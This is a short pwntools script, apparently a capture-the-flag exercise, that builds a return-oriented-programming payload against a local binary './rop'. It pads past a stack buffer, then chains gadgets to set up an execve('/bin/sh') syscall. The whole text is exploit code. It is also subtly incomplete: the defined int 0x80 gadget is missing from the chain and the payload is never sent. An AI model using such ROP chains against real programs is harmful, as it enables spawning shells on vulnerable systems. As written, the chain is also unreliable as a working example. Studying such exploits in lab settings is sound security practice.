from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196

bin_sh = 0x080be408

pop_edx_ecx_ebx = 0x0806eb90

int_0x80 = 0x08049421

addr = 0x1c

payload = flat(['a' * 0x1c + 'bbbb',pop_eax_ret,0xb,pop_edx_ecx_ebx,0,0,bin_sh])
